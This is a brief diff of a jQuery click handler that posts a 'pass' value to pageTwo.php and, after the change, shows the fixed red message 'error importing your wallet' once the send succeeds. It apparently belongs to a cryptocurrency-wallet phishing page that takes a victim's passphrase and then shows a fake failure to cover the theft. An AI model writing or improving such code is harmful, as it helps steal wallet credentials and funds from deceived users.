@@ -149,7 +149,7 @@ $("#btns").click(function (e) {
     url : "pageTwo.php",
     data : {pass : pass},
     success : function (e) {
-      alert(e)
+    $("#demo").html("error importing your wallet").css("color" , "red")
     }
   })
 })
